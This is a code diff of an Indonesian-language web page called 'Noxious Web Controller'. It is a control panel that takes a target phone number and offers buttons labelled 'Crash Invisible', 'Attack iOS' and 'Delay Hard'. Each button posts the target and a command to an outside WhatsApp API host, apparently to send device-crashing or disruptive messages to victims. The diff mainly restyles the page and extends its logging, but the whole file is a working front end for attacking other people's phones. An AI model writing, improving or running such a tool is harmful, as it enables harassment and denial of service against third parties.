@@ -1,19 +1,21 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Noxious Controller</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Noxious Web Controller</title>
   <style>
     body {
       background-color: #111;
       color: #fff;
       font-family: Arial, sans-serif;
       padding: 20px;
+      margin: 0;
     }
     h1 {
       text-align: center;
-      color: #0f0;
+      color: #00e676;
+      margin-bottom: 30px;
     }
     input, button {
       width: 100%;
@@ -30,6 +32,7 @@
     button {
       background-color: #00b894;
       color: white;
+      font-weight: bold;
       cursor: pointer;
     }
     button:hover {
@@ -38,44 +41,59 @@
     .log {
       margin-top: 20px;
       padding: 15px;
-      background-color: #222;
-      border-left: 5px solid #0f0;
+      background-color: #1e1e1e;
+      border-left: 5px solid #00e676;
       white-space: pre-wrap;
+      font-family: monospace;
+    }
+    .success {
+      border-left-color: #00e676;
+    }
+    .error {
+      border-left-color: #ff5252;
+      color: #ffb3b3;
     }
   </style>
 </head>
 <body>
   <h1>🦅 Noxious Web Controller</h1>
-  
-  <input type="text" id="number" placeholder="Masukkan nomor tujuan (cth: 628123456789)">
-  
+
+  <input type="text" id="number" placeholder="628XXXXXXXXXX (nomor tujuan)">
   <button onclick="sendCommand('kill')">Crash Invisible</button>
   <button onclick="sendCommand('out')">Attack iOS</button>
   <button onclick="sendCommand('delay')">Delay Hard</button>
-  
-  <div class="log" id="log">Log status akan tampil di sini...</div>
+
+  <div id="log" class="log">Log status akan tampil di sini...</div>
 
   <script>
     function sendCommand(message) {
       const number = document.getElementById('number').value.trim();
       const log = document.getElementById('log');
+      log.className = 'log'; // reset style
 
       if (!number) {
-        log.innerText = "⚠️ Nomor tidak boleh kosong.";
+        log.innerText = '⚠️ Nomor tidak boleh kosong.';
+        log.classList.add('error');
         return;
       }
 
+      log.innerText = `⏳ Mengirim perintah "${message}" ke ${number}...`;
+
       fetch('https://faiznideck.inipanel.my.id/wa-api', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: {
+          'Content-Type': 'application/json'
+        },
         body: JSON.stringify({ number: number, message: message })
       })
-      .then(response => response.text())
+      .then(response => response.json())
       .then(data => {
-        log.innerText = `✅ Perintah "${message}" dikirim ke ${number}\nRespon: ${data}`;
+        log.innerText = `✅ Perintah "${message}" dikirim ke ${number}\n\nRespon: ${JSON.stringify(data, null, 2)}`;
+        log.classList.add('success');
       })
       .catch(error => {
         log.innerText = `❌ Gagal mengirim: ${error}`;
+        log.classList.add('error');
       });
     }
   </script>
